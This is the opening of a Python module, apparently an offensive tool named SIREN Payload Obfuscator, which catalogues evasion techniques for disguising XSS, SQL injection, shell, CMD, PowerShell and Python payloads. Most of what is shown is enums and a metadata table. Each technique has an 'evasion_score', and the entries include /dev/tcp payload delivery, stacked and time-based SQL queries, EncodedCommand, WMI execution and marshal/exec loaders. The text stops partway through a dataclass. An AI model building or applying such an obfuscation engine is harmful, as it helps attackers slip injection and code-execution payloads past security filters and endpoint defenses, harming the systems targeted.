#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
████████████████████████████████████████████████████████████████████████████████████
██                                                                                ██
██  ⚔️  SIREN PAYLOAD OBFUSCATOR — Multi-Language Payload Obfuscation Engine ⚔️ ██
██                                                                                ██
██  Motor completo de ofuscacao de payloads para multiplas linguagens com          ██
██  tecnicas avancadas de evasao e transformacao polimorfica.                      ██
██                                                                                ██
██  Capacidades:                                                                  ██
██    • JavaScript — String.fromCharCode, template literals, eval alternatives   ██
██    • SQL — CASE WHEN, CONCAT variants, hex encoding, comment injection        ██
██    • CMD/Batch — Variable expansion, IFS manipulation, brace expansion        ██
██    • HTML — Entity encoding, SVG/MathML abuse, data: URI, javascript: URI     ██
██    • Shell/Bash — ${PATH:0:1}, printf, base64 pipe, /dev/tcp abuse           ██
██    • PowerShell — EncodedCommand, tick insertion, .NET reflection             ██
██    • Python — exec/eval, __import__, marshal, codecs rot13, lambda chains     ██
██    • Orchestrator — Auto-detect language, batch obfuscation, variant gen      ██
██    • Effectiveness — Test obfuscation quality, generate detailed reports       ██
██                                                                                ██
██  "SIREN nao esconde o payload — ela o transforma em algo irreconhecivel."      ██
██                                                                                ██
████████████████████████████████████████████████████████████████████████████████████
"""

from __future__ import annotations

import base64
import codecs
import copy
import hashlib
import json
import logging
import math
import os
import random
import re
import string
import struct
import textwrap
import threading
import time
import uuid
from collections import defaultdict, deque
from dataclasses import dataclass, field
from enum import Enum, auto
from typing import (
    Any,
    Callable,
    Deque,
    Dict,
    FrozenSet,
    List,
    Optional,
    Set,
    Tuple,
    Union,
)

logger = logging.getLogger("siren.evasion.payload_obfuscator")


# ════════════════════════════════════════════════════════════════════════════════
# CONSTANTS
# ════════════════════════════════════════════════════════════════════════════════

MAX_PAYLOAD_SIZE = 16384
MAX_OBFUSCATION_DEPTH = 8
MAX_VARIANT_COUNT = 50
DEFAULT_ENTROPY_THRESHOLD = 4.5
MAX_BATCH_SIZE = 500
EFFECTIVENESS_SAMPLE_SIZE = 20


# ════════════════════════════════════════════════════════════════════════════════
# ENUMS
# ════════════════════════════════════════════════════════════════════════════════

class PayloadLanguage(Enum):
    """Supported payload languages for obfuscation."""
    JAVASCRIPT = auto()
    SQL = auto()
    CMD = auto()
    HTML = auto()
    SHELL = auto()
    POWERSHELL = auto()
    PYTHON = auto()
    UNKNOWN = auto()


class ObfuscationLevel(Enum):
    """Obfuscation intensity levels."""
    LIGHT = auto()
    MEDIUM = auto()
    HEAVY = auto()
    EXTREME = auto()


class ObfuscationTechnique(Enum):
    """All available obfuscation techniques across languages."""
    # JavaScript techniques
    JS_STRING_FROMCHARCODE = auto()
    JS_TEMPLATE_LITERAL = auto()
    JS_EVAL_FUNCTION = auto()
    JS_EVAL_SETTIMEOUT = auto()
    JS_EVAL_SETINTERVAL = auto()
    JS_DOM_STRING = auto()
    JS_PROXY_HANDLER = auto()
    JS_ARRAY_JOIN = auto()
    JS_REVERSE_STRING = auto()
    JS_BASE64_ATOB = auto()
    JS_UNICODE_ESCAPE = auto()
    JS_OCTAL_ESCAPE = auto()
    JS_HEX_ESCAPE = auto()
    JS_BRACKET_NOTATION = auto()
    JS_CONSTRUCTOR_CONSTRUCTOR = auto()
    JS_UNESCAPE = auto()

    # SQL techniques
    SQL_CASE_WHEN = auto()
    SQL_IIF_FUNCTION = auto()
    SQL_CONCAT_MYSQL = auto()
    SQL_CONCAT_MSSQL = auto()
    SQL_CONCAT_POSTGRES = auto()
    SQL_CONCAT_ORACLE = auto()
    SQL_HEX_ENCODING = auto()
    SQL_COMMENT_INJECTION = auto()
    SQL_SCIENTIFIC_NOTATION = auto()
    SQL_CHAR_FUNCTION = auto()
    SQL_INFO_SCHEMA_ALT = auto()
    SQL_SYSTEM_TABLE_ALT = auto()
    SQL_NESTED_FUNCTIONS = auto()
    SQL_DOUBLE_QUERY = auto()
    SQL_STACKED_QUERIES = auto()
    SQL_BENCHMARK_SLEEP = auto()

    # CMD techniques
    CMD_VARIABLE_EXPANSION = auto()
    CMD_IFS_MANIPULATION = auto()
    CMD_BRACE_EXPANSION = auto()
    CMD_SUBSHELL_NESTING = auto()
    CMD_BACKTICK_NESTING = auto()
    CMD_BACKSLASH_CONTINUATION = auto()
    CMD_VARIABLE_SUBSTITUTION = auto()
    CMD_INDIRECT_EXPANSION = auto()
    CMD_ARITHMETIC_ABUSE = auto()
    CMD_PROCESS_SUBSTITUTION = auto()

    # HTML techniques
    HTML_ENTITY_DECIMAL = auto()
    HTML_ENTITY_HEX = auto()
    HTML_ENTITY_NAMED = auto()
    HTML_EVENT_NO_QUOTES = auto()
    HTML_SVG_NAMESPACE = auto()
    HTML_MATHML_NAMESPACE = auto()
    HTML_DATA_URI = auto()
    HTML_JAVASCRIPT_URI = auto()
    HTML_META_REFRESH = auto()
    HTML_BASE_TAG = auto()
    HTML_TEMPLATE_TAG = auto()
    HTML_CUSTOM_ELEMENT = auto()

    # Shell techniques
    SHELL_PATH_SLICE = auto()
    SHELL_DOLLAR_HEX = auto()
    SHELL_ECHO_E = auto()
    SHELL_PRINTF = auto()
    SHELL_XXD_REVERSE = auto()
    SHELL_REV_PIPE = auto()
    SHELL_BASE64_PIPE = auto()
    SHELL_HERE_STRING = auto()
    SHELL_FD_REDIRECT = auto()
    SHELL_DEV_TCP = auto()
    SHELL_BRACE_COMMANDS = auto()

    # PowerShell techniques
    PS_ENCODED_COMMAND = auto()
    PS_IEX_ALIAS = auto()
    PS_STRING_REVERSE = auto()
    PS_GET_VARIABLE = auto()
    PS_GCI_VARIABLE = auto()
    PS_TICK_INSERTION = auto()
    PS_FORMAT_OPERATOR = auto()
    PS_BYTE_ARRAY = auto()
    PS_DOTNET_REFLECTION = auto()
    PS_WMI_EXECUTION = auto()
    PS_COM_OBJECT = auto()

    # Python techniques
    PY_EXEC_EVAL = auto()
    PY_DUNDER_IMPORT = auto()
    PY_MARSHAL_LOADS = auto()
    PY_CODECS_ROT13 = auto()
    PY_COMPILE_EXEC = auto()
    PY_TYPE_METACLASS = auto()
    PY_LAMBDA_CHAIN = auto()
    PY_LIST_COMPREHENSION = auto()
    PY_CHR_ORD = auto()
    PY_BASE64_EXEC = auto()


# ════════════════════════════════════════════════════════════════════════════════
# TECHNIQUE METADATA
# ════════════════════════════════════════════════════════════════════════════════

TECHNIQUE_INFO: Dict[ObfuscationTechnique, Dict[str, Any]] = {
    ObfuscationTechnique.JS_STRING_FROMCHARCODE: {
        "name": "String.fromCharCode",
        "language": PayloadLanguage.JAVASCRIPT,
        "min_level": ObfuscationLevel.LIGHT,
        "evasion_score": 0.6,
        "description": "Converts string to charCode array and reconstructs via String.fromCharCode",
    },
    ObfuscationTechnique.JS_TEMPLATE_LITERAL: {
        "name": "Template Literal Abuse",
        "language": PayloadLanguage.JAVASCRIPT,
        "min_level": ObfuscationLevel.LIGHT,
        "evasion_score": 0.5,
        "description": "Abuses ES6 template literals with expressions for string hiding",
    },
    ObfuscationTechnique.JS_EVAL_FUNCTION: {
        "name": "Function() Constructor",
        "language": PayloadLanguage.JAVASCRIPT,
        "min_level": ObfuscationLevel.MEDIUM,
        "evasion_score": 0.7,
        "description": "Uses Function() constructor as eval alternative",
    },
    ObfuscationTechnique.JS_EVAL_SETTIMEOUT: {
        "name": "setTimeout eval",
        "language": PayloadLanguage.JAVASCRIPT,
        "min_level": ObfuscationLevel.MEDIUM,
        "evasion_score": 0.7,
        "description": "Executes code via setTimeout string argument",
    },
    ObfuscationTechnique.JS_EVAL_SETINTERVAL: {
        "name": "setInterval eval",
        "language": PayloadLanguage.JAVASCRIPT,
        "min_level": ObfuscationLevel.MEDIUM,
        "evasion_score": 0.65,
        "description": "Executes code via setInterval string argument",
    },
    ObfuscationTechnique.JS_DOM_STRING: {
        "name": "DOM String Construction",
        "language": PayloadLanguage.JAVASCRIPT,
        "min_level": ObfuscationLevel.HEAVY,
        "evasion_score": 0.8,
        "description": "Builds strings via DOM element manipulation",
    },
    ObfuscationTechnique.JS_PROXY_HANDLER: {
        "name": "Proxy Handler Exploit",
        "language": PayloadLanguage.JAVASCRIPT,
        "min_level": ObfuscationLevel.EXTREME,
        "evasion_score": 0.9,
        "description": "Exploits Proxy handler traps for indirect execution",
    },
    ObfuscationTechnique.JS_ARRAY_JOIN: {
        "name": "Array Join",
        "language": PayloadLanguage.JAVASCRIPT,
        "min_level": ObfuscationLevel.LIGHT,
        "evasion_score": 0.5,
        "description": "Splits string into array and joins with separator",
    },
    ObfuscationTechnique.JS_REVERSE_STRING: {
        "name": "Reverse String",
        "language": PayloadLanguage.JAVASCRIPT,
        "min_level": ObfuscationLevel.LIGHT,
        "evasion_score": 0.45,
        "description": "Reverses the payload string and reconstructs at runtime",
    },
    ObfuscationTechnique.JS_BASE64_ATOB: {
        "name": "Base64 atob",
        "language": PayloadLanguage.JAVASCRIPT,
        "min_level": ObfuscationLevel.MEDIUM,
        "evasion_score": 0.65,
        "description": "Base64 encodes payload and decodes via atob()",
    },
    ObfuscationTechnique.JS_UNICODE_ESCAPE: {
        "name": "Unicode Escape Sequences",
        "language": PayloadLanguage.JAVASCRIPT,
        "min_level": ObfuscationLevel.MEDIUM,
        "evasion_score": 0.7,
        "description": "Replaces characters with \\uXXXX unicode escape sequences",
    },
    ObfuscationTechnique.JS_OCTAL_ESCAPE: {
        "name": "Octal Escapes",
        "language": PayloadLanguage.JAVASCRIPT,
        "min_level": ObfuscationLevel.MEDIUM,
        "evasion_score": 0.6,
        "description": "Uses octal escape sequences in string literals",
    },
    ObfuscationTechnique.JS_HEX_ESCAPE: {
        "name": "Hex Escapes",
        "language": PayloadLanguage.JAVASCRIPT,
        "min_level": ObfuscationLevel.MEDIUM,
        "evasion_score": 0.65,
        "description": "Uses \\xHH hex escape sequences in string literals",
    },
    ObfuscationTechnique.JS_BRACKET_NOTATION: {
        "name": "Bracket Notation Access",
        "language": PayloadLanguage.JAVASCRIPT,
        "min_level": ObfuscationLevel.LIGHT,
        "evasion_score": 0.55,
        "description": "Replaces dot property access with bracket notation",
    },
    ObfuscationTechnique.JS_CONSTRUCTOR_CONSTRUCTOR: {
        "name": "constructor.constructor",
        "language": PayloadLanguage.JAVASCRIPT,
        "min_level": ObfuscationLevel.HEAVY,
        "evasion_score": 0.85,
        "description": "Accesses Function via constructor chain for eval-free execution",
    },
    ObfuscationTechnique.JS_UNESCAPE: {
        "name": "unescape()",
        "language": PayloadLanguage.JAVASCRIPT,
        "min_level": ObfuscationLevel.LIGHT,
        "evasion_score": 0.5,
        "description": "URL-encodes payload and decodes via unescape()",
    },
    ObfuscationTechnique.SQL_CASE_WHEN: {
        "name": "CASE WHEN Alternative",
        "language": PayloadLanguage.SQL,
        "min_level": ObfuscationLevel.LIGHT,
        "evasion_score": 0.6,
        "description": "Replaces IF with CASE WHEN ... THEN ... ELSE ... END",
    },
    ObfuscationTechnique.SQL_IIF_FUNCTION: {
        "name": "IIF Function",
        "language": PayloadLanguage.SQL,
        "min_level": ObfuscationLevel.LIGHT,
        "evasion_score": 0.55,
        "description": "Uses IIF() inline conditional function",
    },
    ObfuscationTechnique.SQL_CONCAT_MYSQL: {
        "name": "MySQL CONCAT",
        "language": PayloadLanguage.SQL,
        "min_level": ObfuscationLevel.MEDIUM,
        "evasion_score": 0.65,
        "description": "MySQL CONCAT() / CONCAT_WS() string building",
    },
    ObfuscationTechnique.SQL_CONCAT_MSSQL: {
        "name": "MSSQL CONCAT",
        "language": PayloadLanguage.SQL,
        "min_level": ObfuscationLevel.MEDIUM,
        "evasion_score": 0.65,
        "description": "MSSQL + operator and CONCAT() string building",
    },
    ObfuscationTechnique.SQL_CONCAT_POSTGRES: {
        "name": "PostgreSQL CONCAT",
        "language": PayloadLanguage.SQL,
        "min_level": ObfuscationLevel.MEDIUM,
        "evasion_score": 0.65,
        "description": "PostgreSQL || operator and CONCAT() string building",
    },
    ObfuscationTechnique.SQL_CONCAT_ORACLE: {
        "name": "Oracle CONCAT",
        "language": PayloadLanguage.SQL,
        "min_level": ObfuscationLevel.MEDIUM,
        "evasion_score": 0.65,
        "description": "Oracle || operator and CONCAT() string building",
    },
    ObfuscationTechnique.SQL_HEX_ENCODING: {
        "name": "SQL Hex Encoding",
        "language": PayloadLanguage.SQL,
        "min_level": ObfuscationLevel.MEDIUM,
        "evasion_score": 0.7,
        "description": "Encodes strings as hex literals (0x414243)",
    },
    ObfuscationTechnique.SQL_COMMENT_INJECTION: {
        "name": "Comment Injection",
        "language": PayloadLanguage.SQL,
        "min_level": ObfuscationLevel.LIGHT,
        "evasion_score": 0.6,
        "description": "Injects inline comments to break keyword signatures",
    },
    ObfuscationTechnique.SQL_SCIENTIFIC_NOTATION: {
        "name": "Scientific Notation",
        "language": PayloadLanguage.SQL,
        "min_level": ObfuscationLevel.MEDIUM,
        "evasion_score": 0.55,
        "description": "Represents numbers in scientific notation (1e0, 2e1)",
    },
    ObfuscationTechnique.SQL_CHAR_FUNCTION: {
        "name": "CHAR/CHR Function",
        "language": PayloadLanguage.SQL,
        "min_level": ObfuscationLevel.MEDIUM,
        "evasion_score": 0.7,
        "description": "Builds strings using CHAR() or CHR() function calls",
    },
    ObfuscationTechnique.SQL_INFO_SCHEMA_ALT: {
        "name": "information_schema Alternatives",
        "language": PayloadLanguage.SQL,
        "min_level": ObfuscationLevel.HEAVY,
        "evasion_score": 0.8,
        "description": "Uses alternative system views instead of information_schema",
    },
    ObfuscationTechnique.SQL_SYSTEM_TABLE_ALT: {
        "name": "System Table Alternatives",
        "language": PayloadLanguage.SQL,
        "min_level": ObfuscationLevel.HEAVY,
        "evasion_score": 0.8,
        "description": "Uses alternative system tables for metadata access",
    },
    ObfuscationTechnique.SQL_NESTED_FUNCTIONS: {
        "name": "Nested Function Calls",
        "language": PayloadLanguage.SQL,
        "min_level": ObfuscationLevel.HEAVY,
        "evasion_score": 0.75,
        "description": "Wraps expressions in nested function calls for obfuscation",
    },
    ObfuscationTechnique.SQL_DOUBLE_QUERY: {
        "name": "Double Query",
        "language": PayloadLanguage.SQL,
        "min_level": ObfuscationLevel.HEAVY,
        "evasion_score": 0.8,
        "description": "Uses subquery inside another query for data exfiltration",
    },
    ObfuscationTechnique.SQL_STACKED_QUERIES: {
        "name": "Stacked Queries",
        "language": PayloadLanguage.SQL,
        "min_level": ObfuscationLevel.EXTREME,
        "evasion_score": 0.85,
        "description": "Appends additional queries via semicolon separator",
    },
    ObfuscationTechnique.SQL_BENCHMARK_SLEEP: {
        "name": "Benchmark/Sleep Alternatives",
        "language": PayloadLanguage.SQL,
        "min_level": ObfuscationLevel.MEDIUM,
        "evasion_score": 0.7,
        "description": "Alternative time-based injection via BENCHMARK, pg_sleep, WAITFOR",
    },
    ObfuscationTechnique.CMD_VARIABLE_EXPANSION: {
        "name": "Variable Expansion %var:~0,1%",
        "language": PayloadLanguage.CMD,
        "min_level": ObfuscationLevel.MEDIUM,
        "evasion_score": 0.7,
        "description": "Builds commands via Windows variable substring expansion",
    },
    ObfuscationTechnique.CMD_IFS_MANIPULATION: {
        "name": "IFS Manipulation",
        "language": PayloadLanguage.CMD,
        "min_level": ObfuscationLevel.MEDIUM,
        "evasion_score": 0.65,
        "description": "Manipulates Internal Field Separator for command splitting",
    },
    ObfuscationTechnique.CMD_BRACE_EXPANSION: {
        "name": "Brace Expansion {e,c,h,o}",
        "language": PayloadLanguage.CMD,
        "min_level": ObfuscationLevel.MEDIUM,
        "evasion_score": 0.65,
        "description": "Uses brace expansion to construct command strings",
    },
    ObfuscationTechnique.CMD_SUBSHELL_NESTING: {
        "name": "$() Nesting",
        "language": PayloadLanguage.CMD,
        "min_level": ObfuscationLevel.HEAVY,
        "evasion_score": 0.75,
        "description": "Nests command substitution via $() for obfuscation",
    },
    ObfuscationTechnique.CMD_BACKTICK_NESTING: {
        "name": "Backtick Nesting",
        "language": PayloadLanguage.CMD,
        "min_level": ObfuscationLevel.HEAVY,
        "evasion_score": 0.7,
        "description": "Uses nested backtick command substitution",
    },
    ObfuscationTechnique.CMD_BACKSLASH_CONTINUATION: {
        "name": "Backslash Continuation",
        "language": PayloadLanguage.CMD,
        "min_level": ObfuscationLevel.LIGHT,
        "evasion_score": 0.45,
        "description": "Splits commands across lines via backslash continuation",
    },
    ObfuscationTechnique.CMD_VARIABLE_SUBSTITUTION: {
        "name": "Variable Substitution ${cmd}",
        "language": PayloadLanguage.CMD,
        "min_level": ObfuscationLevel.MEDIUM,
        "evasion_score": 0.65,
        "description": "Stores commands in variables and expands them",
    },
    ObfuscationTechnique.CMD_INDIRECT_EXPANSION: {
        "name": "Indirect Expansion",
        "language": PayloadLanguage.CMD,
        "min_level": ObfuscationLevel.HEAVY,
        "evasion_score": 0.75,
        "description": "Uses indirect variable reference for command construction",
    },
    ObfuscationTechnique.CMD_ARITHMETIC_ABUSE: {
        "name": "Arithmetic Expansion Abuse",
        "language": PayloadLanguage.CMD,
        "min_level": ObfuscationLevel.EXTREME,
        "evasion_score": 0.85,
        "description": "Abuses arithmetic expansion $(( )) for code execution",
    },
    ObfuscationTechnique.CMD_PROCESS_SUBSTITUTION: {
        "name": "Process Substitution",
        "language": PayloadLanguage.CMD,
        "min_level": ObfuscationLevel.HEAVY,
        "evasion_score": 0.7,
        "description": "Uses process substitution <() for indirect execution",
    },
    ObfuscationTechnique.HTML_ENTITY_DECIMAL: {
        "name": "Decimal Entity Encoding",
        "language": PayloadLanguage.HTML,
        "min_level": ObfuscationLevel.LIGHT,
        "evasion_score": 0.6,
        "description": "Encodes characters as decimal HTML entities &#NNN;",
    },
    ObfuscationTechnique.HTML_ENTITY_HEX: {
        "name": "Hex Entity Encoding",
        "language": PayloadLanguage.HTML,
        "min_level": ObfuscationLevel.LIGHT,
        "evasion_score": 0.65,
        "description": "Encodes characters as hex HTML entities &#xHH;",
    },
    ObfuscationTechnique.HTML_ENTITY_NAMED: {
        "name": "Named Entity Encoding",
        "language": PayloadLanguage.HTML,
        "min_level": ObfuscationLevel.LIGHT,
        "evasion_score": 0.5,
        "description": "Uses named HTML entities where available",
    },
    ObfuscationTechnique.HTML_EVENT_NO_QUOTES: {
        "name": "Event Handlers Without Quotes",
        "language": PayloadLanguage.HTML,
        "min_level": ObfuscationLevel.MEDIUM,
        "evasion_score": 0.7,
        "description": "Attribute event handlers without quote delimiters",
    },
    ObfuscationTechnique.HTML_SVG_NAMESPACE: {
        "name": "SVG Namespace Abuse",
        "language": PayloadLanguage.HTML,
        "min_level": ObfuscationLevel.HEAVY,
        "evasion_score": 0.8,
        "description": "Embeds scripts via SVG elements and namespace tricks",
    },
    ObfuscationTechnique.HTML_MATHML_NAMESPACE: {
        "name": "MathML Namespace Abuse",
        "language": PayloadLanguage.HTML,
        "min_level": ObfuscationLevel.HEAVY,
        "evasion_score": 0.8,
        "description": "Embeds scripts via MathML elements and namespace tricks",
    },
    ObfuscationTechnique.HTML_DATA_URI: {
        "name": "data: URI",
        "language": PayloadLanguage.HTML,
        "min_level": ObfuscationLevel.MEDIUM,
        "evasion_score": 0.75,
        "description": "Embeds payload via data: URI scheme",
    },
    ObfuscationTechnique.HTML_JAVASCRIPT_URI: {
        "name": "javascript: URI Encoding",
        "language": PayloadLanguage.HTML,
        "min_level": ObfuscationLevel.MEDIUM,
        "evasion_score": 0.7,
        "description": "Uses javascript: URI with various encodings",
    },
    ObfuscationTechnique.HTML_META_REFRESH: {
        "name": "Meta Refresh",
        "language": PayloadLanguage.HTML,
        "min_level": ObfuscationLevel.MEDIUM,
        "evasion_score": 0.6,
        "description": "Uses meta http-equiv=refresh for redirection with payload",
    },
    ObfuscationTechnique.HTML_BASE_TAG: {
        "name": "Base Tag Manipulation",
        "language": PayloadLanguage.HTML,
        "min_level": ObfuscationLevel.HEAVY,
        "evasion_score": 0.75,
        "description": "Manipulates base tag to redirect relative URLs",
    },
    ObfuscationTechnique.HTML_TEMPLATE_TAG: {
        "name": "Template Tag",
        "language": PayloadLanguage.HTML,
        "min_level": ObfuscationLevel.MEDIUM,
        "evasion_score": 0.65,
        "description": "Hides payload inside template tag content",
    },
    ObfuscationTechnique.HTML_CUSTOM_ELEMENT: {
        "name": "Custom Element Abuse",
        "language": PayloadLanguage.HTML,
        "min_level": ObfuscationLevel.HEAVY,
        "evasion_score": 0.75,
        "description": "Abuses custom HTML elements for script execution",
    },
    ObfuscationTechnique.SHELL_PATH_SLICE: {
        "name": "${PATH:0:1} Slicing",
        "language": PayloadLanguage.SHELL,
        "min_level": ObfuscationLevel.MEDIUM,
        "evasion_score": 0.75,
        "description": "Extracts characters from environment variables via slicing",
    },
    ObfuscationTechnique.SHELL_DOLLAR_HEX: {
        "name": "$'\\x41' Hex Literal",
        "language": PayloadLanguage.SHELL,
        "min_level": ObfuscationLevel.MEDIUM,
        "evasion_score": 0.7,
        "description": "Uses $'\\xHH' ANSI-C quoting for hex character literals",
    },
    ObfuscationTechnique.SHELL_ECHO_E: {
        "name": "echo -e",
        "language": PayloadLanguage.SHELL,
        "min_level": ObfuscationLevel.LIGHT,
        "evasion_score": 0.5,
        "description": "Uses echo -e with escape sequences for string construction",
    },
    ObfuscationTechnique.SHELL_PRINTF: {
        "name": "printf",
        "language": PayloadLanguage.SHELL,
        "min_level": ObfuscationLevel.MEDIUM,
        "evasion_score": 0.65,
        "description": "Uses printf with format specifiers for string construction",
    },
    ObfuscationTechnique.SHELL_XXD_REVERSE: {
        "name": "xxd Reverse",
        "language": PayloadLanguage.SHELL,
        "min_level": ObfuscationLevel.HEAVY,
        "evasion_score": 0.8,
        "description": "Encodes payload as hex dump and reverses via xxd -r",
    },
    ObfuscationTechnique.SHELL_REV_PIPE: {
        "name": "rev Pipe",
        "language": PayloadLanguage.SHELL,
        "min_level": ObfuscationLevel.LIGHT,
        "evasion_score": 0.5,
        "description": "Reverses payload string and pipes through rev command",
    },
    ObfuscationTechnique.SHELL_BASE64_PIPE: {
        "name": "base64 Pipe",
        "language": PayloadLanguage.SHELL,
        "min_level": ObfuscationLevel.MEDIUM,
        "evasion_score": 0.65,
        "description": "Base64 encodes payload and decodes via base64 -d pipe",
    },
    ObfuscationTechnique.SHELL_HERE_STRING: {
        "name": "Here String <<<",
        "language": PayloadLanguage.SHELL,
        "min_level": ObfuscationLevel.MEDIUM,
        "evasion_score": 0.6,
        "description": "Passes payload via here string (<<<) to commands",
    },
    ObfuscationTechnique.SHELL_FD_REDIRECT: {
        "name": "File Descriptor Redirection",
        "language": PayloadLanguage.SHELL,
        "min_level": ObfuscationLevel.HEAVY,
        "evasion_score": 0.8,
        "description": "Uses file descriptor manipulation for indirect execution",
    },
    ObfuscationTechnique.SHELL_DEV_TCP: {
        "name": "/dev/tcp Abuse",
        "language": PayloadLanguage.SHELL,
        "min_level": ObfuscationLevel.EXTREME,
        "evasion_score": 0.85,
        "description": "Uses /dev/tcp for network-based payload delivery",
    },
    ObfuscationTechnique.SHELL_BRACE_COMMANDS: {
        "name": "Brace Expansion Commands",
        "language": PayloadLanguage.SHELL,
        "min_level": ObfuscationLevel.MEDIUM,
        "evasion_score": 0.7,
        "description": "Uses {cmd1,cmd2} brace expansion to build command strings",
    },
    ObfuscationTechnique.PS_ENCODED_COMMAND: {
        "name": "-EncodedCommand",
        "language": PayloadLanguage.POWERSHELL,
        "min_level": ObfuscationLevel.LIGHT,
        "evasion_score": 0.5,
        "description": "Base64-encoded UTF-16LE command via -EncodedCommand parameter",
    },
    ObfuscationTechnique.PS_IEX_ALIAS: {
        "name": "IEX / & Aliases",
        "language": PayloadLanguage.POWERSHELL,
        "min_level": ObfuscationLevel.LIGHT,
        "evasion_score": 0.55,
        "description": "Uses iex, & operator, or Invoke-Expression aliases",
    },
    ObfuscationTechnique.PS_STRING_REVERSE: {
        "name": "String Reverse [char[]]",
        "language": PayloadLanguage.POWERSHELL,
        "min_level": ObfuscationLevel.MEDIUM,
        "evasion_score": 0.65,
        "description": "Reverses string via [char[]]$s[-1..-$s.Length] -join ''",
    },
    ObfuscationTechnique.PS_GET_VARIABLE: {
        "name": "Get-Variable",
        "language": PayloadLanguage.POWERSHELL,
        "min_level": ObfuscationLevel.MEDIUM,
        "evasion_score": 0.7,
        "description": "Accesses variables indirectly via Get-Variable cmdlet",
    },
    ObfuscationTechnique.PS_GCI_VARIABLE: {
        "name": "GCI Variable:",
        "language": PayloadLanguage.POWERSHELL,
        "min_level": ObfuscationLevel.MEDIUM,
        "evasion_score": 0.7,
        "description": "Accesses variables via Get-ChildItem Variable: provider",
    },
    ObfuscationTechnique.PS_TICK_INSERTION: {
        "name": "Tick Insertion i`nv`oke",
        "language": PayloadLanguage.POWERSHELL,
        "min_level": ObfuscationLevel.LIGHT,
        "evasion_score": 0.6,
        "description": "Inserts backticks within PowerShell keywords",
    },
    ObfuscationTechnique.PS_FORMAT_OPERATOR: {
        "name": "-f Format Operator",
        "language": PayloadLanguage.POWERSHELL,
        "min_level": ObfuscationLevel.MEDIUM,
        "evasion_score": 0.7,
        "description": "Builds strings via -f format operator with indexed args",
    },
    ObfuscationTechnique.PS_BYTE_ARRAY: {
        "name": "Byte Array Execution",
        "language": PayloadLanguage.POWERSHELL,
        "min_level": ObfuscationLevel.HEAVY,
        "evasion_score": 0.8,
        "description": "Stores payload as byte array and converts at runtime",
    },
    ObfuscationTechnique.PS_DOTNET_REFLECTION: {
        "name": ".NET Reflection",
        "language": PayloadLanguage.POWERSHELL,
        "min_level": ObfuscationLevel.EXTREME,
        "evasion_score": 0.9,
        "description": "Uses .NET reflection to invoke methods indirectly",
    },
    ObfuscationTechnique.PS_WMI_EXECUTION: {
        "name": "WMI Execution",
        "language": PayloadLanguage.POWERSHELL,
        "min_level": ObfuscationLevel.EXTREME,
        "evasion_score": 0.85,
        "description": "Executes payload via WMI process creation",
    },
    ObfuscationTechnique.PS_COM_OBJECT: {
        "name": "COM Object Methods",
        "language": PayloadLanguage.POWERSHELL,
        "min_level": ObfuscationLevel.HEAVY,
        "evasion_score": 0.8,
        "description": "Uses COM objects (WScript.Shell etc.) for execution",
    },
    ObfuscationTechnique.PY_EXEC_EVAL: {
        "name": "exec/eval Variants",
        "language": PayloadLanguage.PYTHON,
        "min_level": ObfuscationLevel.LIGHT,
        "evasion_score": 0.5,
        "description": "Wraps payload in exec() or eval() with string manipulation",
    },
    ObfuscationTechnique.PY_DUNDER_IMPORT: {
        "name": "__import__ + getattr",
        "language": PayloadLanguage.PYTHON,
        "min_level": ObfuscationLevel.MEDIUM,
        "evasion_score": 0.7,
        "description": "Dynamic imports via __import__ and getattr chains",
    },
    ObfuscationTechnique.PY_MARSHAL_LOADS: {
        "name": "marshal.loads",
        "language": PayloadLanguage.PYTHON,
        "min_level": ObfuscationLevel.HEAVY,
        "evasion_score": 0.8,
        "description": "Serializes code object via marshal and deserializes at runtime",
    },
    ObfuscationTechnique.PY_CODECS_ROT13: {
        "name": "codecs.decode rot13",
        "language": PayloadLanguage.PYTHON,
        "min_level": ObfuscationLevel.MEDIUM,
        "evasion_score": 0.6,
        "description": "Encodes payload with ROT13 and decodes via codecs.decode",
    },
    ObfuscationTechnique.PY_COMPILE_EXEC: {
        "name": "compile + exec",
        "language": PayloadLanguage.PYTHON,
        "min_level": ObfuscationLevel.MEDIUM,
        "evasion_score": 0.65,
        "description": "Compiles code object from string and executes",
    },
    ObfuscationTechnique.PY_TYPE_METACLASS: {
        "name": "type() Metaclass",
        "language": PayloadLanguage.PYTHON,
        "min_level": ObfuscationLevel.HEAVY,
        "evasion_score": 0.8,
        "description": "Creates classes dynamically via type() with exec in methods",
    },
    ObfuscationTechnique.PY_LAMBDA_CHAIN: {
        "name": "Lambda Chains",
        "language": PayloadLanguage.PYTHON,
        "min_level": ObfuscationLevel.MEDIUM,
        "evasion_score": 0.65,
        "description": "Chains lambda functions for indirect computation",
    },
    ObfuscationTechnique.PY_LIST_COMPREHENSION: {
        "name": "List Comprehension Abuse",
        "language": PayloadLanguage.PYTHON,
        "min_level": ObfuscationLevel.MEDIUM,
        "evasion_score": 0.6,
        "description": "Abuses list comprehension side effects for execution",
    },
    ObfuscationTechnique.PY_CHR_ORD: {
        "name": "chr() + ord() Construction",
        "language": PayloadLanguage.PYTHON,
        "min_level": ObfuscationLevel.LIGHT,
        "evasion_score": 0.55,
        "description": "Builds strings via chr() and ord() conversions",
    },
    ObfuscationTechnique.PY_BASE64_EXEC: {
        "name": "Base64 Import Execution",
        "language": PayloadLanguage.PYTHON,
        "min_level": ObfuscationLevel.MEDIUM,
        "evasion_score": 0.65,
        "description": "Base64-encodes payload and executes via exec(b64decode())",
    },
}

# Map language to its techniques
LANGUAGE_TECHNIQUES: Dict[PayloadLanguage, List[ObfuscationTechnique]] = defaultdict(list)
for _tech, _info in TECHNIQUE_INFO.items():
    LANGUAGE_TECHNIQUES[_info["language"]].append(_tech)


# ════════════════════════════════════════════════════════════════════════════════
# DATACLASSES
# ════════════════════════════════════════════════════════════════════════════════

@dataclass
class ObfuscationResult:
    """Result of a single obfuscation operation."""
    original: str = ""
    obfuscated: str = ""
    language: str = ""
    level: str = ""
    techniques_applied: List[str] = field(default_factory=list)
    technique_enum: Optional[ObfuscationTechnique] = None
    size_original: int = 0
    size_obfuscated: int = 0
    size_ratio: float = 0.0
    entropy_original: float = 0.0
    entropy_obfuscated: float = 0.0
    entropy_delta: float = 0.0
    evasion_score: float = 0.0
    timestamp: float = field(default_factory=time.time)
    result_id: str = field(default_factory=lambda: uuid.uuid4().hex[:12])
    metadata: Dict[str, Any] = field(default_factory=dict)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "result_id": self.result_id,
            "original": self.original,
            "obfuscated": self.obfuscated,
            "language": self.language,
            "level": self.level,
            "techniques_applied": self.techniques_applied,
            "technique_enum": self.technique_enum.name if self.technique_enum else None,
